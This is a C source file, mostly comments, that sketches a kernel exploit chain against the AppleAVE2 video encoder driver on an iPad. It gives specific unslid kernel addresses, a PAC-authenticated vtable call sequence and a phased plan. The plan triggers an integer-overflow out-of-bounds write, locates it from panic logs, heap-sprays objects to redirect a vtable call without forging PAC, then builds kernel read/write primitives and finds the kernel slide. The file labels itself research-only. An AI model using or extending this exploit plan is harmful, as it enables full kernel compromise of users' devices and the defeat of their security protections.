/*
 * physrw_helpers.c — post-code-exec primitives sketch for the AVE chain
 * After gaining a vtable-slot method call, build kernel R/W.
 * NOTE: addresses are iPad 26.3 AppleAVE2 static values; slide applies.
 *
 * Research-only.
 */

#include <stdint.h>

/* Verified static addresses in iPad 26.3 AppleAVE2 (unslid, kernel VA) */
#define AVE_MUL_OVERFLOW      0xfffffff0089f34f4UL  /* mul w24,w22,w21 */
#define AVE_DPB_CFG           0xfffffff008a5ee7cUL  /* reads dev+0x16c */
#define AVE_POWERON           0xfffffff008a6f17cUL  /* AVE_Drv::PowerOn */
#define AVE_VTABLE_CALL       0xfffffff008ab3c84UL  /* obj+0xb8 -> blraa */
#define AVE_DEV_B8_FIELD      0x0b8UL               /* obj ptr field */
#define AVE_VTABLE_SLOT       0x0b0UL               /* vtable slot offset */
#define AVE_PAC_MODIFIER      0xcda1UL              /* autda key modifier */

/*
 * The vtable call sequence (verified):
 *   ldr x0,[dev+0xb8]          ; target object (OOB-overwritable)
 *   ldr x16,[x0]               ; vtable ptr (already PAC-signed in memory)
 *   mov x17,x0; movk x17,#0xcda1,lsl#0x30
 *   autda x16,x17              ; PAC verify — passes if x0 points to a REAL object
 *   ldr x8,[x16,#0xb0]         ; slot
 *   blraa x8,x16               ; call
 *
 * Object-replacement attack: OOB-write dev+0xb8 to point at an existing
 * AVE sub-object whose vtable+0xb0 slot method is useful (or whose args
 * we control). No PAC forgery needed.
 */

/* Phase A: confirm OOB write primitive reachability (crash-first approach)
 * 1. Build with overflow dims, run on device.
 * 2. Collect panic log (crashreportcopymobile / syslog_relay).
 * 3. Locate the OOB write target in the panic: it should be near the
 *    kalloc allocation of the AVE sub-object; measure offset to +0xb8.
 */
struct phase_a_result {
    uint64_t oob_write_addr;   /* from panic */
    uint64_t dev_obj_addr;     /* from panic or heap feng-shui */
    uint64_t delta_to_b8;      /* must be < OOB write size */
};

/* Phase B: object replacement
 * Find AVE sub-object allocations (kalloc type from ctor sub_aac988).
 * Strategy: spray N encoding sessions, each creates a sub-object with a
 * valid signed vtable. OOB write redirects dev+0xb8 to one of these.
 */
struct spray_session {
    void *dev;         /* AVE device obj (has +0xb8) */
    void *subobj;      /* the object currently at dev+0xb8 */
};

/* Phase C: post-call primitives — after blraa lands in a method we control
 * (e.g. a method whose args map to attacker data), build:
 *   - kernel_write(addr, data): via the method's buffer write with the
 *     oversized copy length (same overflow class, tuned).
 *   - kernel_read: via InfoClass-style method that copies kernel data out.
 * Then physrw: locate kernel slide via a known vtable pointer value,
 * compute __TEXT_EXEC base, disable/hook what is needed.
 */

/* The three calls to make on device (in order):
 * 1. triggerOOB()          — Swift, overflow dims
 * 2. collectPanic()        — confirm write addr (VERIFY-1/5)
 * 3. sprayAndReplace()     — object replacement, then trigger PowerOn
 */
